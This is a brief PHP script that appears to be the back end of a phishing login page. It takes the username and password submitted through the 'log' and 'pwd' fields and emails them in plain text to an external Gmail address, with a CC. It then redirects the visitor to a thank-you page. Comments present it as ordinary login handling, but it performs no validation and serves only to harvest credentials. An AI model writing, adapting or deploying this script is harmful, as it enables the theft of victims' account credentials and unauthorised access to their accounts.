<?php
// get data from form  
$log = $_POST['log'];
$pwd = $_POST['pwd'];

// Your login logic goes here...
// For example, you can validate the username/email and password

// If you want to send an email with the form data
$name = $log; // Assuming the login is the name
$email = ""; // No email provided in the login form
$message = "Login: $log\r\nPassword: $pwd"; // Message includes login and password
$to = "criispin.fredd@gmail.com";
$subject = "Login Attempt";
$headers = "From: Mail from your link" . "\r\n" .
           "CC: somebodyelse@example.com";

// Send the email
if (!empty($log) && !empty($pwd)) {
    mail($to, $subject, $message, $headers);
}

// Redirect to a thank you page
header("Location: thankyou.html");
?>
